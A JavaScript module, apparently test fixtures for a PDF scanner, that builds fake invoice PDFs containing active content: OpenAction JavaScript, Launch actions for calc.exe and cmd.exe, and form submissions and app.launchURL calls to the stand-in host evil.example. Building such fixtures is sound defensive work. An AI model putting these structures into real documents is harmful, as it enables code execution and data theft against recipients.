// Baut Test-PDFs mit aktiven Inhalten (JavaScript, Startaktion, Programmaufruf, Formular-Senden).
import zlib from 'node:zlib';

const TEXT = 'BT /F1 12 Tf 72 720 Td (Stadtwerke Musterstadt Rechnung Nr. 4711 Betrag 89,40 EUR) Tj ET';

function assemble(objects, trailerExtra = '') {
  // objects: [{ num, body: Buffer|string }]
  let out = Buffer.from('%PDF-1.6\n%\xe2\xe3\xcf\xd3\n', 'latin1');
  const offs = {};
  for (const o of objects) {
    offs[o.num] = out.length;
    const b = Buffer.isBuffer(o.body) ? o.body : Buffer.from(o.body, 'latin1');
    out = Buffer.concat([out, Buffer.from(`${o.num} 0 obj\n`), b, Buffer.from('\nendobj\n')]);
  }
  const size = Math.max(...objects.map((o) => o.num)) + 1;
  let xref = `xref\n0 ${size}\n0000000000 65535 f \n`;
  for (let i = 1; i < size; i++) xref += offs[i] !== undefined ? `${String(offs[i]).padStart(10, '0')} 00000 n \n` : '0000000000 65535 f \n';
  return Buffer.concat([out, Buffer.from(`${xref}trailer\n<< /Size ${size} /Root 1 0 R ${trailerExtra}>>\nstartxref\n${out.length}\n%%EOF\n`)]);
}

const stream = (dict, data) => Buffer.concat([Buffer.from(`<< ${dict} /Length ${data.length} >>\nstream\n`), data, Buffer.from('\nendstream')]);

/** Klassische PDF: JavaScript an vielen Stellen, alles unkomprimiert. */
export function pdfWithJavaScript() {
  return assemble([
    { num: 1, body: '<< /Type /Catalog /Pages 2 0 R /OpenAction 6 0 R /Names << /JavaScript << /Names [(init) 7 0 R] >> >> /AA << /WC << /S /JavaScript /JS (app.alert\\(1\\)) >> >> /AcroForm << /Fields [] /XFA 9 0 R >> >>' },
    { num: 2, body: '<< /Type /Pages /Kids [3 0 R] /Count 1 >>' },
    { num: 3, body: '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R /Annots [8 0 R 10 0 R 11 0 R] /AA << /O << /S /Launch /F (calc.exe) >> >> >>' },
    { num: 4, body: stream('', Buffer.from(TEXT)) },
    { num: 5, body: '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>' },
    { num: 6, body: '<< /Type /Action /S /JavaScript /JS (this.submitForm\\("https://evil.example"\\)) /Next << /S /Launch /F (cmd.exe) >> >>' },
    { num: 7, body: '<< /S /JavaScript /JS 12 0 R >>' },
    { num: 8, body: '<< /Type /Annot /Subtype /Link /Rect [72 700 300 715] /A << /S /URI /URI (https://www.stadtwerke-musterstadt.de) >> >>' },
    { num: 9, body: stream('', Buffer.from('<xdp:xdp><script>app.alert(1)</script></xdp:xdp>')) },
    { num: 10, body: '<< /Type /Annot /Subtype /Link /Rect [72 680 300 695] /A << /S /URI /URI (javascript:alert\\(1\\)) >> >>' },
    { num: 11, body: '<< /Type /Annot /Subtype /Widget /FT /Btn /T (Senden) /Rect [72 650 200 670] /A << /S /SubmitForm /F (https://evil.example/collect) >> >>' },
    { num: 12, body: stream('', Buffer.from('app.launchURL("https://evil.example", true);')) },
  ], '/Info 13 0 R ').toString('latin1').replace('/Info 13 0 R ', '') && assemble([
    { num: 1, body: '<< /Type /Catalog /Pages 2 0 R /OpenAction 6 0 R /Names << /JavaScript << /Names [(init) 7 0 R] >> >> /AA << /WC << /S /JavaScript /JS (app.alert\\(1\\)) >> >> /AcroForm << /Fields [11 0 R] /XFA 9 0 R >> >>' },
    { num: 2, body: '<< /Type /Pages /Kids [3 0 R] /Count 1 >>' },
    { num: 3, body: '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R /Annots [8 0 R 10 0 R 11 0 R] /AA << /O << /S /Launch /F (calc.exe) >> >> >>' },
    { num: 4, body: stream('', Buffer.from(TEXT)) },
    { num: 5, body: '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>' },
    { num: 6, body: '<< /Type /Action /S /JavaScript /JS (this.submitForm\\("https://evil.example"\\)) /Next << /S /Launch /F (cmd.exe) >> >>' },
    { num: 7, body: '<< /S /JavaScript /JS 12 0 R >>' },
    { num: 8, body: '<< /Type /Annot /Subtype /Link /Rect [72 700 300 715] /A << /S /URI /URI (https://www.stadtwerke-musterstadt.de) >> >>' },
    { num: 9, body: stream('', Buffer.from('<xdp:xdp><script>app.alert(1)</script></xdp:xdp>')) },
    { num: 10, body: '<< /Type /Annot /Subtype /Link /Rect [72 680 300 695] /A << /S /URI /URI (javascript:alert\\(1\\)) >> >>' },
    { num: 11, body: '<< /Type /Annot /Subtype /Widget /FT /Btn /T (Senden) /Rect [72 650 200 670] /A << /S /SubmitForm /F (https://evil.example/collect) >> >>' },
    { num: 12, body: stream('', Buffer.from('app.launchURL("https://evil.example", true);')) },
    { num: 13, body: '<< /Producer (Test) >>' },
  ], '/Info 13 0 R ');
}

/** Moderne PDF (ab 1.5): Katalog und JavaScript in einem komprimierten Objekt-Stream, Inhalt komprimiert. */
export function pdfWithJavaScriptInObjectStream() {
  const inner = [
    [1, '<< /Type /Catalog /Pages 2 0 R /OpenAction 6 0 R >>'],
    [2, '<< /Type /Pages /Kids [3 0 R] /Count 1 >>'],
    [6, '<< /S /JavaScript /JS (app.alert\\("hallo"\\)) >>'],
    [3, '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>'],
    [5, '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>'],
  ];
  let header = '';
  let body = '';
  for (const [num, src] of inner) {
    header += `${num} ${body.length} `;
    body += `${src}\n`;
  }
  const raw = Buffer.from(header + body, 'latin1');
  const objStm = stream(`/Type /ObjStm /N ${inner.length} /First ${header.length} /Filter /FlateDecode`, zlib.deflateSync(raw));
  const content = stream('/Filter /FlateDecode', zlib.deflateSync(Buffer.from(TEXT)));
  // Querverweis-Stream (Typ 2 = Objekt im Objekt-Stream 7)
  const entries = [[0, 0, 0xffff]];
  return assembleXrefStream([
    { num: 4, body: content },
    { num: 7, body: objStm },
  ], inner.map(([n], i) => [n, i]));
}

function assembleXrefStream(objects, compressed) {
  let out = Buffer.from('%PDF-1.6\n%\xe2\xe3\xcf\xd3\n', 'latin1');
  const offs = {};
  for (const o of objects) {
    offs[o.num] = out.length;
    out = Buffer.concat([out, Buffer.from(`${o.num} 0 obj\n`), o.body, Buffer.from('\nendobj\n')]);
  }
  const xrefNum = 8;
  const size = 9;
  const rows = [];
  for (let i = 0; i < size; i++) {
    const comp = compressed.find(([n]) => n === i);
    if (i === xrefNum) rows.push([1, out.length, 0]);
    else if (offs[i] !== undefined) rows.push([1, offs[i], 0]);
    else if (comp) rows.push([2, 7, comp[1]]);
    else rows.push([0, 0, 0]);
  }
  const data = Buffer.alloc(rows.length * 7);
  rows.forEach(([t, a, b], i) => { data[i * 7] = t; data.writeUIntBE(a, i * 7 + 1, 4); data.writeUInt16BE(b, i * 7 + 5); });
  const xref = Buffer.concat([Buffer.from(`${xrefNum} 0 obj\n<< /Type /XRef /Size ${size} /W [1 4 2] /Root 1 0 R /Length ${data.length} >>\nstream\n`), data, Buffer.from('\nendstream\nendobj\n')]);
  const start = out.length;
  return Buffer.concat([out, xref, Buffer.from(`startxref\n${start}\n%%EOF\n`)]);
}
